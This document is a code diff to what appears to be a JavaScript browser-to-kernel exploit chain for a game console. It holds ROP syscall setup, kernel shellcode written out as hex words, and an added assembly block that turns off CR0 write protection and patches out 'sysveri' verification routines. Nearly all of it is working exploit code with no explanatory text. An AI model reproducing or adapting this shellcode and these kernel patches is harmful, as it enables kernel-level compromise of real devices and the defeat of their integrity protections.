@@ -209,7 +209,7 @@ function stage2() {
   chain = new rop();
   if (chain.syscall(23, 0).low == 0x0) {
     
-    var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
+    var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
 
     var loader_writer = payload_loader.backing;
@@ -784,47 +784,58 @@ function stage3() {
   exec_writer[38] = 0x200F6666;
   exec_writer[39] = 0xFF2548C0;
   exec_writer[40] = 0x0FFFFEFF;
-  exec_writer[41] = 0xBE48C022;
-  exec_writer[42] = 0x90909090;
-  exec_writer[43] = 0x8B499090;
-  exec_writer[44] = 0x08B78948;
-  exec_writer[45] = 0xC700264C;
-  exec_writer[46] = 0x087B7087;
-  exec_writer[47] = 0x0000B800;
-  exec_writer[48] = 0x9087C700;
-  exec_writer[49] = 0x00000004;
-  exec_writer[50] = 0x66000000;
-  exec_writer[51] = 0x04B987C7;
-  exec_writer[52] = 0x90900000;
-  exec_writer[53] = 0xBD87C766;
-  exec_writer[54] = 0x90000004;
-  exec_writer[55] = 0x87C76690;
-  exec_writer[56] = 0x000004C6;
-  exec_writer[57] = 0x87C6E990;
-  exec_writer[58] = 0x001D2336;
-  exec_writer[59] = 0x3987C637;
-  exec_writer[60] = 0x37001D23;
-  exec_writer[61] = 0xC187C766;
-  exec_writer[62] = 0x9000094E;
-  exec_writer[63] = 0x87C766E9;
-  exec_writer[64] = 0x0009547B;
-  exec_writer[65] = 0x87C7E990;
-  exec_writer[66] = 0x002F2C20;
-  exec_writer[67] = 0xC3C03148;
-  exec_writer[68] = 0x7087C748;
-  exec_writer[69] = 0x02011258;
-  exec_writer[70] = 0x48000000;
-  exec_writer[71] = 0xB192B78D;
-  exec_writer[72] = 0x89480006;
-  exec_writer[73] = 0x125878B7;
-  exec_writer[74] = 0x9C87C701;
-  exec_writer[75] = 0x01011258;
-  exec_writer[76] = 0x48000000;
-  exec_writer[77] = 0x0100000D;
-  exec_writer[78] = 0xC0220F00;
-  exec_writer[79] = 0x8080B848;
-  exec_writer[80] = 0x80808080;
-  exec_writer[81] = 0x90C38080;
+  exec_writer[41] = 0x87C6C022;
+  exec_writer[42] = 0x0063A160;
+  exec_writer[43] = 0xC087C7C3;
+  exec_writer[44] = 0x480063AC;
+  exec_writer[45] = 0xC7C3C031;
+  exec_writer[46] = 0x639F1087;
+  exec_writer[47] = 0xC0314800;
+  exec_writer[48] = 0xE087C7C3;
+  exec_writer[49] = 0x480063A6;
+  exec_writer[50] = 0xC6C3C031;
+  exec_writer[51] = 0x67B5C087;
+  exec_writer[52] = 0xBE480002;
+  exec_writer[53] = 0x90909090;
+  exec_writer[54] = 0x8B499090;
+  exec_writer[55] = 0x08B78948;
+  exec_writer[56] = 0xC700264C;
+  exec_writer[57] = 0x087B7087;
+  exec_writer[58] = 0x0000B800;
+  exec_writer[59] = 0x9087C700;
+  exec_writer[60] = 0x00000004;
+  exec_writer[61] = 0x66000000;
+  exec_writer[62] = 0x04B987C7;
+  exec_writer[63] = 0x90900000;
+  exec_writer[64] = 0xBD87C766;
+  exec_writer[65] = 0x90000004;
+  exec_writer[66] = 0x87C76690;
+  exec_writer[67] = 0x000004C6;
+  exec_writer[68] = 0x87C6E990;
+  exec_writer[69] = 0x001D2336;
+  exec_writer[70] = 0x3987C637;
+  exec_writer[71] = 0x37001D23;
+  exec_writer[72] = 0xC187C766;
+  exec_writer[73] = 0x9000094E;
+  exec_writer[74] = 0x87C766E9;
+  exec_writer[75] = 0x0009547B;
+  exec_writer[76] = 0x87C7E990;
+  exec_writer[77] = 0x002F2C20;
+  exec_writer[78] = 0xC3C03148;
+  exec_writer[79] = 0x7087C748;
+  exec_writer[80] = 0x02011258;
+  exec_writer[81] = 0x48000000;
+  exec_writer[82] = 0xB192B78D;
+  exec_writer[83] = 0x89480006;
+  exec_writer[84] = 0x125878B7;
+  exec_writer[85] = 0x9C87C701;
+  exec_writer[86] = 0x01011258;
+  exec_writer[87] = 0x48000000;
+  exec_writer[88] = 0x0100000D;
+  exec_writer[89] = 0xC0220F00;
+  exec_writer[90] = 0x8080B848;
+  exec_writer[91] = 0x80808080;
+  exec_writer[92] = 0x90C38080;
 
   p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
   p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
@@ -902,6 +913,13 @@ mov rdi, 0x6666666666666666
 mov rax, cr0
 and rax, 0xFFFFFFFFFFFEFFFF
 mov cr0, rax
+
+//sysveri just die
+mov byte ptr [rdi + 0x63a160], 0xC3
+mov dword ptr [rdi + 0x63acc0], 0xC3C03148
+mov dword ptr [rdi + 0x639f10], 0xC3C03148
+mov dword ptr [rdi + 0x63a6e0], 0xC3C03148
+mov byte ptr [rdi + 0x267b5c0], 0x00
 
 //mprotect
 mov rsi, 0x8B49909090909090
